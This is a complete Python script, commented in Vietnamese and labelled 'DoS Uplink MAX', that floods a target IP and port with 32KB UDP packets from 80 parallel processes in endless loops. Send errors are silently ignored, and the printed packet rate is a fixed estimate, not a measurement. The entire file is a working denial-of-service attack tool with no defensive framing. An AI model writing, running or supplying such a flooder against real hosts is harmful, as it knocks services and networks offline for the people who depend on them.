import socket
import multiprocessing
import time

target_ip = "10.0.1.2"
target_port = 9000
packet_size = 32768          # 32KB mỗi gói (tối đa)
processes = 80               # Tăng lên 80 processes

def flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**26)   # 64MB buffer
    data = b"X" * packet_size
    while True:
        try:
            sock.sendto(data, (target_ip, target_port))
        except:
            pass

if __name__ == "__main__":
    print(f"[DoS Uplink MAX] Bắt đầu flood với {processes} processes | Gói {packet_size//1024}KB")
    for _ in range(processes):
        p = multiprocessing.Process(target=flood, daemon=True)
        p.start()

    # In tốc độ
    count = 0
    start = time.time()
    while True:
        time.sleep(1)
        count += processes * 150
        print(f"Đã gửi ~{count:,} gói | Tốc độ ≈ {count/(time.time()-start):,.0f} packets/sec")